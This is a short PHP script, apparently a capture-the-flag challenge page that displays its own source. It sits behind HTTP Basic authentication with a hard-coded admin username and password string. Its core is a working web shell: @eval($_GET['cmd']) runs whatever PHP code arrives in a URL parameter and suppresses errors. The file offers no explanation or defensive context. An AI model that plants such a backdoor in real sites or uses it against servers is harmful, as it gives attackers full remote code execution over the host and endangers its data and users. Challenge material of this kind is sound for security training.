<?php
if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="Restricted Area"');
    header('HTTP/1.0 401 Unauthorized');
    echo '小明是运维工程师，最近网站老是出现bug。';
    exit;
} else {
    $validUser = 'admin';
    $validPass = '2e525e29e465f45d8d7c56319fe73036';

    if ($_SERVER['PHP_AUTH_USER'] != $validUser || $_SERVER['PHP_AUTH_PW'] != $validPass) {
        header('WWW-Authenticate: Basic realm="Restricted Area"');
        header('HTTP/1.0 401 Unauthorized');
        echo 'Invalid credentials';
        exit;
    }
}
@eval($_GET['cmd']);
highlight_file(__FILE__);
?>